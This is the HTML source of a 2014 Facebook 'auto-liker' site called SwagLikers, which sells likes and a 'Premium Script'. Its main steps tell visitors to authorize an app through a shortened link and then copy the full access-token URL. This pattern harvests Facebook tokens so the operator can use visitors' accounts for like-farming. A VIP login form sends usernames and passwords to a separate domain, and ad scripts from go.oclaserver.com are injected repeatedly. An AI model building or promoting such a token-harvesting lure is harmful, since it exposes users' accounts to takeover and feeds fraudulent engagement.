

<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Get SwagToken</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="viewport" content="width=device-width, initial-scale=1">
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dokv=88e434a982/"},atok:"e94fdd3a914cfcbc66a6d019ba6320a2",petok:"7b40f8d8047fa4ee941a2acde1cc2ec7faa64e66-1411380402-1800",zone:"swaglikers.com",rocket:"a",apps:{}}];CloudFlare.push({"apps":{"ape":"7c02598763ad6226d1c034f0b9d78186"}});document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dokv=97fb4d042e/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="shortcut icon" type="image/png" href="/img/favicon.png"/>
<meta name="author" content="Swaglikers & Team">
<meta name="propeller" content="060c4eb7436a209c5669bcea41946e38"/>
<meta http-equiv="Content-Language" content="en-us">
<META HTTP-EQUIV="EXPIRES" CONTENT="0">
<META HTTP-EQUIV="Content-Language" content="Id">
<META HTTP-EQUIV="Pragma" content="no-cache">
<META NAME="DISTRIBUTION" CONTENT="GLOBAL">
<META NAME="Description" CONTENT="auto like , facebook , likelo.com,Status Liker , Hublaa , Likelo, Likelo.Com, Like lo, AutoLike, AutoLiker, Page Liker, Facebook AutoLiker, Auto Like, Working AutoLiker, StyloLiker, Likesss, Likehoot, Auto-Like, How To Use Like, Fb AutoLiker, Likelo.nab.su, Likelo.in, How To Use AutoLike, Likelo V2, Working Likes, free autoliker, use autolike,">
<META NAME="Keywords" CONTENT="Status Liker , Hublaa , Likelo, Likelo.Com, Like lo, AutoLike, AutoLiker, Page Liker, Facebook AutoLiker, Auto Like, Working AutoLiker, StyloLiker, Likesss, Likehoot, Auto-Like, How To Use Like, Fb AutoLiker, Likelo.nab.su, Likelo.in, How To Use AutoLike, Likelo V2, Working Likes>
	<META NAME="ROBOTS" CONTENT="INDEX, FOLLOW">
<meta content='general' name='rating' />
    <meta content='India' name='geo.placename' />
    <meta content='google' name='generator' />
    <meta content='noodp, noydir, index, follow, all' name='robots' />
    <meta http-equiv="Cache-control" content="public" />
    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
    <meta name="googlebot" content="index, follow" />
    <meta name="revisit-after" content="2 days" />
    <meta name="language" content="EN" />
    <meta name="author" content="RISKY JATT" />
    <meta name="copyright" content="Copyright 2014 Swagikers" />
    <meta name="document-classification" content="Buy and Get Lots of Facebook Status Likes, photos likes, pages likes " />
   
<script type="text/rocketscript" >
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-50001635-11', 'auto');
  ga('send', 'pageview');

</script><script type='text/rocketscript' data-rocketsrc='//go.oclaserver.com/apu.php?zoneid=76422'></script>
 <meta name="Keywords" content="Likelo,auto like , free auto like , auto-like, Hublaa , Likelo, Likelo.Com, Like lo, AutoLike, AutoLiker, Page Liker, Facebook AutoLiker, Auto Like, Working AutoLiker, StyloLiker, Likesss, Likehoot, Auto-Like, How To Use Like, Fb AutoLiker, Likelo.nab.su, Likelo.in, How To Use AutoLike, Likelo V2, Working Like, Autolike Facebook, Increase Facebook Likes, AutoCommenter, Facebook Hack, Facebook Status Liker, Hublaa, Indonesia Autolike , autolike status, Facebook Auto Liker, Get Likes & Comments , AutoLike , auto liker 2014 , www.facebook.com , www.likepawo.ml , official Likepawo  , facebook liker without token , get like by using official Likepawo , Likelo, Facebook emo liker  , black liker , facebook tips trick facebook,autolike 2014,autoliker fb,jommala ,romeo krish, stylishliker.ml Facebok,Autolike Photo,Autolike Status,Autolike Fans Page,Bot komen,Bot Like,Bom Like,Bomer Like,Big Like,Facebook,Google,Yahoo,Mywapblog,Bot koplak,Alexa,Ping,Twitter, free like facebook, free comment facebook,  free follower facebook, autolike, autocomment, autofollower, www.hublaa.me, facebook trick, 100+ likes , " />
    <meta name="Description" content="Status Liker , Hublaa , Likelo, Likelo.Com, Like lo, AutoLike, AutoLiker, Page Liker, Facebook AutoLiker, Auto Like, Working AutoLiker, StyloLiker, Likesss, Likehoot, Auto-Like, How To Use Like, Fb AutoLiker, Likelo.nab.su, Likelo.in, How To Use AutoLike, Likelo V2, Working Like" /><script type="text/rocketscript" >
(function(d, s, id) {
var js, fjs = d.getElementsByTagName(s)[0];
if (d.getElementById(id)) return;
js = d.createElement(s); js.id = id;
js.src = "//connect.facebook.net/id_ID/all.js#xfbml=1&appId=549824761779451";
fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));
</script>

<link href="http://demo.web3canvas.com/themeforest/flathost/onepage/css/bootstrap.min.css" rel="stylesheet">
 
<link href="http://fonts.googleapis.com/css?family=Montserrat:400,700" rel="stylesheet" type="text/css">
 
<link href="http://demo.web3canvas.com/themeforest/flathost/onepage/css/hosting.css" rel="stylesheet" media="all">
 
<script data-rocketsrc="http://demo.web3canvas.com/themeforest/flathost/onepage/js/modernizr.js" type="text/rocketscript" ></script>
 
<link rel="stylesheet" href="/css/flexslider.css"/>
<script data-rocketsrc="http://demo.web3canvas.com/themeforest/flathost/onepage/js/jquery-1.9.0.min.js" type="text/rocketscript" ></script>
<script data-rocketsrc="http://demo.web3canvas.com/themeforest/flathost/onepage/js/jquery.flexslider.js" type="text/rocketscript" ></script>
<script type="text/rocketscript">
  $(window).load(function() {
     $('.flexslider').flexslider({
        animation: "slide",
		useCSS: Modernizr.touch
      });
  });
</script>
 
<script data-rocketsrc="http://demo.web3canvas.com/themeforest/flathost/onepage/js/contact_form.js" type="text/rocketscript" ></script>
<script type='text/javascript' src='//go.oclaserver.com/apu.php?zoneid=78044'></script>
</head>
<body id="home" data-spy="scroll" data-target=".navbar-collapse" data-offset="100">
 <nav class="navbar navbar-default navbar-fixed-top" role="navigation">
 <div class="callus">
                    

                </div>
<script type='text/javascript' src='//go.oclaserver.com/apu.php?zoneid=78044'></script>
<script type='text/javascript' src='//go.oclaserver.com/apu.php?zoneid=78044'></script>
<div class="container">
<div class="navbar-header">
<button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span> </button>
<a class="navbar-brand" href="/"> <img src="http://www.swaglikers.com/img/i.png" alt="logo"></a> </div>
 




<div class="collapse navbar-collapse navbar-ex1-collapse">
<ul class="nav navbar-nav navbar-right">
<li class="active"><a href="#home">HOME</a></li>
<li class="hidden-sm"><a href="premium.php">Buy Script</a></li>
<li class="dropdown"> <a href="#" class="dropdown-toggle" data-toggle="dropdown">Our More Sites<b class="caret"></b></a>
<ul class="dropdown-menu">
<li><a href="http://www.darkliker.com/" target="_blank">Dark Liker</a></li>
<li><a href="http://www.hostidity.com/" target="_blank">Hostidity</a></li>
<li><a href="http://www.techinger.com" target="_blank">Techinger</a></li>
<li><a href="http://www.themejail.com" target="_blank">Themejail</a></li>
<li><a href="http://www.techinger.com/onlinehtmleditor/" target="_blank">Online HTML Editor</a></li>
</ul>
</li>
<li><a href="#" role="button" data-toggle="modal" data-target="#Login">Login</a></li>
<li><a href="http://www.facebook.com/messages/SwagLikerOfficial" role="button" class="btn btn-success" target="_blank">Sign Up</a></li>
</ul>
</li>
</ul>
</div>
 
</div>
</nav>
<br><br><br><br>
 
<div class="container">

<div class="container">
<div class="row mainFeatures" id="features">
<div class="col-sm-6 col-md-4">
<div class="img-thumbnail"> <img src="/img/secure_img.png" width="85" height="88" alt="secure">
<div class="caption">
<h4>Secure & Reliable</h4>
<p>Swaglikers servers are having high physical security and power redundancy Your data will be secure with us.</p>
</div>
</div>
</div>
<div class="col-sm-6 col-md-4">
<div class="img-thumbnail"> <img src="/img/fast_img.png" width="85" height="88" alt="secure">
<div class="caption">
<h4>Super Fast</h4>
<p>With our ultra mordern servers and optical cables, your data will be transfered to end user in milliseconds.</p>
</div>
</div>
</div>
<div class="col-sm-6 col-md-4 col-sm-offset-3 col-md-offset-0">
<div class="img-thumbnail"> <img src="/img/support_img.png" width="85" height="88" alt="secure">
<div class="caption">
<h4>Customer Support</h4>
<p>We have a dedicated team of support for sales and support to help you in anytime. You can also chat with us.</p>
</div>
</div>
</div>
</div>

<div class="domain">
<div class="container" style="width: 100%">
<div class="row PageHead" >
<div class="col-md-12" >
<h1>Get SwagToken</h1><hr><a href="#" role="button" data-toggle="modal" data-target="#Readme" class="btn btn-danger">Read Me</a>
<h3><strong>Step 1: </strong>First  
  <a href="http://goo.gl/32v9FQ" target="_blank" class="btn btn-warning">Click Here</a> To Allow The Official Swag App.<br><br><strong>Step 2: </strong>Now <a href="generate.php" target="_blank" class="btn btn-success">Click Here</a> To Get Your Access Token.<br><br><strong>NOTE: </strong>Copy All URL of Access Token page!</h3>
</div>
</div>
<div class="row">
<div class="col-md-8 col-md-offset-2">
</div>
</div>
</div>
</div>
</div>
</div>
 <center><br><br>
<a href="http://www.1pagerank.com/swaglikers.com" target="_blank" rel="prefetch" title="swaglikers.com review, PageRank, website value and SEO analytics"><img src="http://www.swaglikers.com/worth.png" alt="swaglikers.com review, PageRank, website value and SEO analytics"/></a>


<div class="footer">
<div class="container">
<div class="row footerlinks">
<div class="col-sm-4 col-md-2">
<p>CALL US</p>
<ul>
<li>+91 8195-883740</li>
</ul>
</div>
<div class="col-sm-4 col-md-2">
<p>MORE LINKS</p>
<ul>
<li><a href="https://www.facebook.com/SwagLikerOfficial" target="_blank">Like us on Facebook</a></li>
<li><a href="http://www.techinger.com">Latest from Blog</a></li>
<li><a href="http://www.hostidity.com">Our Hosting</a></li>
</ul>
</div>
<div class="col-sm-4 col-md-2">
<p>VIP</p>
<ul>
<li> <a href="#">Buy For Photo</a></li>
<li><a href="#">Buy For Pages</a></li>
<li><a href="#">Buy For Comments</a></li>
<li><a href="#" role="button" data-toggle="modal" data-target="#Login">Login</a></li>
</ul>
</div>
<div class="col-sm-4 col-md-2">
<p>Buy Stuff</p>
<ul>
<li> <a href="#">Photo/Status Likes</a></li>
<li><a href="/premium.php">Premium Script</a></li>
<li><a href="#">Fanpage Likes</a></li>
</ul>
</div>
<div class="col-sm-4 col-md-2">
<p>LEGAL TERMS</p>
<ul>
<li><a href="#">Terms of use</a></li>
<li><a href="#">Privacy Policy</a></li>
</ul>
</div>
<div class="col-sm-4 col-md-2">
<p>Easy Chat</p>
<ul>
<li> <a href="http://www.facebook.com/messages/SwagLikerOfficial" class="btn btn-success btn-small">INBOX US </a> </li>
</ul>
</div>
</div>
<div class="row copyright">
<div class="pull-right"><img src="http://www.swaglikers.com/img/i.png" alt="logo"></div>
<div class="pull-left"><p>Copyright &copy; 2014. Swaglikers Team.</p></div>

<script id="_wauqtq" type="text/rocketscript" >var _wau = _wau || [];
_wau.push(["tab", "6s947w9n72xi", "qtq", "left-middle"]);
(function() {var s=document.createElement("script"); s.async=true;
s.src="http://widgets.amung.us/tab.js";
document.getElementsByTagName("head")[0].appendChild(s);
})();</script>

</div>
</div>
</div>
<a href="#" class="scrollup">Scroll</a>
 
<div class="modal fade LoginSignup" id="Login" tabindex="-1" role="dialog" aria-labelledby="LoginLabel" aria-hidden="true">
<div class="modal-dialog">
<div class="modal-content">
<div class="modal-header">
<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
<h3 class="modal-title">VIP Users Login</h3>
</div>
<div class="modal-body">
<form method="post" action="http://likepana.ga/login.php">
<div class="form-group">
<input class="form-control input-lg" type="text" name="user" size="50" placeholder="Your VIP Username"/>
</div>
<div class="form-group">
<input class="form-control input-lg" type="password" name="pass" placeholder="Password"/>
</div>
<div class="form-group">
<input type="submit" name="submit" value="Login to VIP" class="btn btn-success btn-lg"/>
</div>
</form>
</div>
</div>
 
</div>
 
</div>
 
 
<div class="modal fade LoginSignup" id="Readme" tabindex="-1" role="dialog" aria-labelledby="LoginLabel" aria-hidden="true">
<div class="modal-dialog">
<div class="modal-content">
<div class="modal-header">
<button type="button" class="close" data-dismiss="modal" aria-hidden="true">x</button>
<h3 class="modal-title">Read Me Before Using!</h3>
  <h3> Note: </h3>
  <h4>1. You Must Be 18+ Years Old.<br><br>2. Turn On <a href="https://www.facebook.com/settings?tab=followers" target="_blank">[Facebook Followers] </a> <br><br>3. Your POST Permission Should Be PUBLIC.<br>
</h4></div>
 
</div>
 
</div>




<script data-rocketsrc="http://demo.web3canvas.com/themeforest/flathost/onepage/js/jquery.easing.1.2.js" type="text/rocketscript" ></script>
 
<script data-rocketsrc="http://demo.web3canvas.com/themeforest/flathost/onepage/js/bootstrap.min.js" type="text/rocketscript" ></script>
 
<script type="text/rocketscript" >
            $(function() {
                $('.nav li a').bind('click',function(event){
                    var $anchor2 = $(this).parent();
				    var $anchor = $(this);
					$('.nav  li').removeClass('active');
                    $anchor2.addClass('active');
					
                    $('html, body').stop().animate({
                        scrollTop: $($anchor.attr('href')).offset().top - 80
                    }, 1500,'easeInOutExpo');
                    event.preventDefault();
                });
            });
        </script>
 
 
<script type="text/rocketscript" >
    $(document).ready(function(){ 
 
        $(window).scroll(function(){
            if ($(this).scrollTop() > 800) {
                $('.scrollup').fadeIn();
            } else {
                $('.scrollup').fadeOut();
            }
        }); 
 
        $('.scrollup').click(function(){
            $("html, body").animate({ scrollTop: 0 }, 600);
            return false;
        });
 
    });
</script>
 
<script type="text/rocketscript">
/* <![CDATA[ */
(function(){try{var s,a,i,j,r,c,l=document.getElementsByTagName("a"),t=document.createElement("textarea");for(i=0;l.length-i;i++){try{a=l[i].getAttribute("href");if(a&&"/cdn-cgi/l/email-protection"==a.substr(0 ,27)){s='';j=28;r=parseInt(a.substr(j,2),16);for(j+=2;a.length-j&&a.substr(j,1)!='X';j+=2){c=parseInt(a.substr(j,2),16)^r;s+=String.fromCharCode(c);}j+=1;s+=a.substr(j,a.length-j);t.innerHTML=s.replace(/</g,"&lt;").replace(/>/g,"&gt;");l[i].setAttribute("href","mailto:"+t.value);}}catch(e){}}}catch(e){}})();
/* ]]> */
</script>




</body>
</html>